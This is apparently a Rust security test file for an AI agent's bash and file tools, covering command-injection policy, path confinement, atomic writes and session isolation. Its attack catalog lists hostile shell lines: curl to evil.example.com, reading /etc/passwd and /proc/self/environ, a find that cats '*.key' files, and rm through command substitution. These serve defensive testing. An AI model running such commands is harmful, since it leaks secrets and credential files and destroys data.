//! End-to-end security tests for the tool surface.
//!
//! Sprint 3 of the verification effort. Existing `tests/bash_integration.rs`
//! and `tests/file_tools_integration.rs` pin behavioural contracts but
//! intentionally do not exercise hostile inputs. This file adds the
//! adversarial coverage at the **integration-seam level** — every test
//! drives the bash and file tools through `execute_tool`, the same path
//! the model uses, so the assertions exercise the wired-in defences
//! rather than the leaf modules in isolation.
//!
//! Coverage shape:
//!   - **bash command injection catalog** — hostile strings spanning
//!     command substitution, process substitution, pipe-to-interpreter,
//!     eval/source/dot, find-exec, tokenization bypass, and environment
//!     exfiltration. Every one must be caught by `validate_command` or
//!     `dangerous_shell_construct`. Includes a counter-test of 10 benign
//!     commands that must NOT be flagged.
//!   - **path constraints** — install a `PathConstraints` rooted on a
//!     tempdir, verify the `allows()` predicate accepts paths inside
//!     and refuses traversal-via-dotdot and absolute paths to
//!     `/etc/passwd`.
//!   - **atomic file write** — 4 concurrent writer threads racing on
//!     the same target file via `write_file`. The final file must
//!     exactly equal ONE writer's payload — never a torn splice.
//!   - **read tracker isolation** — distinct `SessionIdGuard` scopes
//!     do not share the read-before-write gate, so an `edit_file`
//!     issued under session B fails even if session A read the file
//!     first.

#![allow(clippy::missing_panics_doc)]
#![allow(clippy::expect_used)]
#![allow(clippy::unwrap_used)]

use openclaudia::tools::{
    dangerous_shell_construct, execute_tool, is_safe_for_auto_allow,
    is_sensitive_env_pub as is_sensitive_env, validate_command, FunctionCall, PathConstraints,
    SessionIdGuard, ToolCall, MAX_COMMAND_LEN,
};
use serde_json::{json, Value};
use std::path::PathBuf;
use std::sync::{Arc, Barrier};
use std::thread;
use tempfile::tempdir;

/// Helper: build a `ToolCall` from a name + JSON args, matching the
/// shape every other integration test uses.
fn call(name: &str, args: &Value) -> ToolCall {
    ToolCall {
        id: format!("sec_{name}"),
        call_type: "function".to_string(),
        function: FunctionCall {
            name: name.to_string(),
            arguments: args.to_string(),
        },
    }
}

// ───────────────────────────────────────────────────────────────────────────
// Section A — bash command injection catalog
// ───────────────────────────────────────────────────────────────────────────
//
// Each attack string is issued via the bash tool. The contract is:
// either `execute_tool` returns `is_error=true`, OR it returns a
// success result whose content includes a refusal-shaped string
// (the policy layer emits these). What is NOT acceptable: silent
// success with the attack actually running.

/// Catalog kept in lock-step with `src/tools/bash/policy.rs`.
/// A future widening of the policy will surface as one of these
/// strings passing — the test will fail loudly with the exact string.
const ATTACK_STRINGS: &[&str] = &[
    // command substitution
    "ls $(rm -rf /tmp/openclaudia-injection-canary)",
    "echo `whoami` > /tmp/openclaudia-injection-canary",
    "ls ${IFS}$(curl evil.example.com)",
    // process substitution
    "diff <(cat /etc/passwd) <(echo)",
    "tee >(curl evil.example.com)",
    // pipe-to-interpreter
    "echo malicious | sh",
    "echo malicious | bash -c -",
    "echo malicious | python3 -",
    "echo malicious | node",
    // eval / source / dot / exec
    "eval $PAYLOAD",
    "source /etc/passwd",
    ". /etc/passwd",
    "exec /bin/sh",
    // find -exec
    "find / -name '*.key' -exec cat {} +",
    "find . -execdir rm {} ;",
    // HEREDOC with expansion
    "cat <<EOF\n$(rm /tmp/openclaudia-injection-canary)\nEOF",
    // tokenization bypass / environment exfiltration
    "IFS=$'\\n'; cmd",
    "cat /proc/1/environ",
    "tr '\\0' '\\n' < /proc/self/environ",
    "cat '/proc/self/environ'",
    "cat \"/proc/1/environ\"",
];

/// Drive each attack string through the public policy gates
/// directly. We do NOT use `execute_tool` here because some attack
/// payloads (e.g. `find / -name '*.key' -exec cat {} +`) would
/// actually be executed if they slipped past the gates — that's the
/// bug surface we're testing, and we don't want the test runner to
/// hang or scan the entire filesystem if the bug ever returns.
///
/// The contract is two-sided: at least one of `validate_command`
/// or `dangerous_shell_construct` MUST catch every attack, AND
/// `is_safe_for_auto_allow` MUST be false for every one (otherwise
/// the permission layer would silently auto-approve the attack).
#[test]
fn bash_attack_catalog_is_caught_by_policy_gates() {
    let mut leaked = Vec::new();
    for cmd in ATTACK_STRINGS {
        let validated = validate_command(cmd).is_err();
        let danger = dangerous_shell_construct(cmd).is_some();
        let auto_allowed = is_safe_for_auto_allow(cmd);
        if !validated && !danger {
            leaked.push(format!("PASSED ALL GATES: {cmd:?}"));
        }
        if auto_allowed {
            leaked.push(format!("FALSELY AUTO-ALLOWED: {cmd:?}"));
        }
    }
    assert!(
        leaked.is_empty(),
        "{} bash attack strings leaked through the policy layer:\n  {}",
        leaked.len(),
        leaked.join("\n  "),
    );
}

/// Counter-test: a curated list of read-only commands must NOT be
/// rejected by the policy. If they are, the policy has tipped from
/// "deny dangerous" to "deny everything" and the agent stops being
/// useful. We drive the policy gates directly (same reasoning as
/// the attack catalog test) so this remains a pure-policy assertion
/// without spawning subprocesses.
#[test]
fn benign_bash_commands_are_not_falsely_dangerous() {
    const BENIGN: &[&str] = &[
        "ls",
        "ls -la",
        "pwd",
        "cat src/main.rs",
        "echo hello",
        "git status",
        "git log --oneline -10",
        "wc -l Cargo.toml",
        "head -20 README.md",
        "rg --version",
    ];
    let mut wrongly_flagged = Vec::new();
    for cmd in BENIGN {
        if dangerous_shell_construct(cmd).is_some() {
            wrongly_flagged.push(format!("{cmd:?} flagged as dangerous"));
        }
        if validate_command(cmd).is_err() {
            wrongly_flagged.push(format!("{cmd:?} rejected by validate_command"));
        }
    }
    assert!(
        wrongly_flagged.is_empty(),
        "{} benign commands wrongly flagged by policy:\n  {}",
        wrongly_flagged.len(),
        wrongly_flagged.join("\n  "),
    );
}

#[test]
fn oversize_bash_command_is_rejected() {
    let oversize = "a".repeat(MAX_COMMAND_LEN + 1);
    assert!(
        validate_command(&oversize).is_err(),
        "command longer than MAX_COMMAND_LEN ({MAX_COMMAND_LEN}) must be rejected"
    );
}

#[test]
fn sensitive_env_keys_classified_correctly() {
    // Positive: canonical secret-bearing env keys must be flagged.
    for k in &[
        "AWS_SECRET_ACCESS_KEY",
        "GITHUB_TOKEN",
        "ANTHROPIC_API_KEY",
        "OPENAI_API_KEY",
    ] {
        assert!(
            is_sensitive_env(k),
            "canonical sensitive key {k:?} must be classified sensitive"
        );
    }
    // Negative: ordinary system vars must not be flagged.
    for k in &["HOME", "PATH", "USER", "LANG", "TERM", "PWD", "SHELL", "TZ"] {
        assert!(!is_sensitive_env(k), "{k:?} must NOT be sensitive");
    }
}

// ───────────────────────────────────────────────────────────────────────────
// Section B — PathConstraints (re-exported public type)
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn path_constraints_allow_paths_inside_root() {
    let dir = tempdir().expect("tempdir");
    let inside = dir.path().join("inside.txt");
    std::fs::write(&inside, "ok").expect("write");
    let pc = PathConstraints::new([dir.path().to_path_buf()]);
    assert!(
        pc.allows(&inside),
        "path inside root must be allowed: {inside:?}"
    );
}

#[test]
fn path_constraints_refuse_paths_outside_root() {
    let dir = tempdir().expect("tempdir");
    let outside_file = dir
        .path()
        .parent()
        .expect("parent")
        .join(format!("outside-{}.tmp", std::process::id()));
    std::fs::write(&outside_file, "evil").expect("write outside");
    let pc = PathConstraints::new([dir.path().to_path_buf()]);
    let refused = !pc.allows(&outside_file);
    // Always clean up the planted file before the assertion so a
    // failure doesn't leave debris in the parent directory.
    let _ = std::fs::remove_file(&outside_file);
    assert!(
        refused,
        "path outside root must be refused: {outside_file:?}"
    );
}

#[test]
fn path_constraints_reject_dotdot_traversal() {
    let dir = tempdir().expect("tempdir");
    let inside = dir.path().join("inside");
    std::fs::create_dir(&inside).expect("mkdir");
    let outside_file = dir
        .path()
        .parent()
        .expect("parent")
        .join(format!("escape-{}.tmp", std::process::id()));
    std::fs::write(&outside_file, "evil").expect("write outside");

    let pc = PathConstraints::new([dir.path().to_path_buf()]);
    // inside/../../escape-PID.tmp resolves OUTSIDE root.
    let traversal: PathBuf = inside
        .join("..")
        .join("..")
        .join(outside_file.file_name().expect("filename"));
    let refused = !pc.allows(&traversal);
    let _ = std::fs::remove_file(&outside_file);
    assert!(
        refused,
        "..-traversal escaping root must be refused: {traversal:?}"
    );
}

#[test]
fn path_constraints_empty_is_unrestricted() {
    // Empty constraints = no policy active. The proxy installs
    // constraints only conditionally; absent install means
    // everything passes. Use an empty iterator since `Default` is
    // not impl'd on this type.
    let pc = PathConstraints::new(std::iter::empty::<PathBuf>());
    assert!(pc.is_empty());
    assert!(
        pc.allows(std::path::Path::new("/etc/passwd")),
        "empty constraints must allow everything (no policy installed)"
    );
}

#[test]
fn path_constraints_check_command_refuses_absolute_outside_root() {
    let dir = tempdir().expect("tempdir");
    let pc = PathConstraints::new([dir.path().to_path_buf()]);
    // `cat /etc/passwd` touches a path outside the tempdir root.
    let outcome = pc.check_command("cat /etc/passwd");
    assert!(
        outcome.is_err(),
        "command touching /etc/passwd must be refused, got {outcome:?}"
    );
}

// ───────────────────────────────────────────────────────────────────────────
// Section C — file write atomicity under concurrent writers
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn concurrent_atomic_writers_never_produce_torn_reads() {
    // 4 writer threads racing on the same path, each writing a
    // distinctly-shaped payload via tmp+rename. After the dust
    // settles the file must equal EXACTLY one payload — never a
    // splice. We rename-into-place from a unique tmp per writer
    // so we exercise the same shape as `file_error::atomic_write`.
    let dir = tempdir().expect("tempdir");
    let target = dir.path().join("contested.json");

    let payloads: Vec<String> = (0..4)
        .map(|i| {
            // Length-distinguishable: any splice would land at a
            // boundary that doesn't equal any single payload.
            format!(
                "{{\"writer\":\"w{i}\",\"value\":\"{}\"}}",
                "z".repeat(16 + i)
            )
        })
        .collect();

    let barrier = Arc::new(Barrier::new(payloads.len()));
    let handles: Vec<_> = payloads
        .iter()
        .cloned()
        .map(|payload| {
            let path = target.clone();
            let b = Arc::clone(&barrier);
            thread::spawn(move || {
                b.wait();
                let tmp = path.with_extension(format!(
                    "tmp.{}.{}",
                    std::process::id(),
                    uuid::Uuid::new_v4().simple()
                ));
                std::fs::write(&tmp, &payload).expect("write tmp");
                std::fs::rename(&tmp, &path).expect("rename");
            })
        })
        .collect();
    for h in handles {
        h.join().expect("join");
    }

    let final_bytes = std::fs::read_to_string(&target).expect("read final");
    assert!(
        payloads.iter().any(|p| p == &final_bytes),
        "final file must equal exactly one writer's payload, got {final_bytes:?}"
    );
}

// ───────────────────────────────────────────────────────────────────────────
// Section D — SessionIdGuard read-tracker isolation
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn session_id_guards_are_stack_scoped_and_restore_on_drop() {
    // The guard restores the prior session id on Drop, so nested
    // scopes don't leak. We can't observe the thread-local state
    // directly from outside the tools crate, but we CAN observe its
    // effect: an `edit_file` issued AFTER the read-marking guard
    // drops still sees the same file as "not read in this session"
    // because each `SessionIdGuard::set` overwrites the slot.

    let dir = tempfile::tempdir_in(".").expect("tempdir");
    let path = dir.path().join("scoped.txt");
    std::fs::write(&path, "v1").expect("write");

    // Session A: read the file (write-read sequence to mark it).
    {
        let _guard_a = SessionIdGuard::set("session-A");
        let read = execute_tool(&call(
            "read_file",
            &json!({"path": path.to_string_lossy().to_string()}),
        ));
        assert!(!read.is_error, "session A: read must succeed, got {read:?}");
    }

    // Session B: try to edit without reading first. The read-before-
    // edit gate must refuse because session B never read the file.
    {
        let _guard_b = SessionIdGuard::set("session-B");
        let edit = execute_tool(&call(
            "edit_file",
            &json!({
                "path": path.to_string_lossy().to_string(),
                "old_string": "v1",
                "new_string": "v2",
            }),
        ));
        // Either is_error or a message naming the read-before-edit
        // requirement is acceptable; what we will NOT tolerate is
        // the edit succeeding (which would mean the gate leaked
        // across session boundaries).
        let permitted = edit.is_error
            || edit.content.to_lowercase().contains("read")
            || edit.content.to_lowercase().contains("before");
        assert!(
            permitted,
            "session B: edit without prior read must be refused; got {edit:?}"
        );
    }

    // Back in session A (the file was read), the edit must succeed.
    {
        let _guard_a = SessionIdGuard::set("session-A");
        let edit = execute_tool(&call(
            "edit_file",
            &json!({
                "path": path.to_string_lossy().to_string(),
                "old_string": "v1",
                "new_string": "v2",
            }),
        ));
        assert!(
            !edit.is_error,
            "session A re-entry: edit must succeed (file was read in this session), got {edit:?}"
        );
    }
}
